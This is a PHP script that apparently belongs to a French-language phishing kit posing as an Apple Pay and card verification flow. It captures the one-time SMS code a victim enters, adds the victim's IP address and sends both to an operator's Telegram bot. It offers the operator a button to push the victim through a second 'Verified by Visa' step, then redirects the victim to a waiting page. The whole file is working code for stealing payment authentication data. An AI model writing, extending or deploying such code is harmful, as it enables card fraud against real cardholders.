<?php
error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../nword.php';
$bin = substr(str_replace(' ', '', $_SESSION["c_num"]), 0, 6);
$msgdureztuconnaissss = urlencode("ㅤ\n [📱] Apple Pay 1 [📱] \n ㅤ\n ✔️ Apple Pay : " . $_POST['sms'] . "\n \n 🗑 Adresse IP: " . _ip() . "\n ㅤ");

$lancevbv = $_SERVER['HTTP_HOST'] . '/functions/actionvbv2.php?ip=' . _ip();

$button = urlencode(json_encode([
    'inline_keyboard' => [
        [
            ['text' => 'Lancer le vbv N°2 si c faux', 'url' => $lancevbv]
        ]
    ]
]));

$html = file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . $group_id . '&text=' . $msgdureztuconnaissss . '&reply_markup=' . $button);

header('location: ../waiting2.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

?>